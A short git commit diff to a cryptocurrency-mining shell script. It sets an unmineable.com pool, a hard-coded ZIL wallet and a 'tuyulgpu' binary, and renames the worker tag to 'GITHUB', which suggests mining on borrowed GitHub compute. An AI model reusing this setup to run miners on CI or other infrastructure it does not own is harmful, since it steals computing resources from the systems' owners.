6c82cafb5c31841f992e423c082e006334cc8b3e
Mangadiw97 <86317036+Mangadiw97@users.noreply.github.com>
2021-08-05 02:29:30 +0800

    Update zilliqa.sh

--- zilliqa.sh
+++ zilliqa.sh
@@ -4,7 +4,7 @@ POOL=ethash.unmineable.com:3333
 
 WALLET=ZIL:zil1d2tk5elhtufrfrqs9sc68d40xhcchqr4z8vr2k
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-GITHUB)
 
 chmod +x tuyulgpu
 
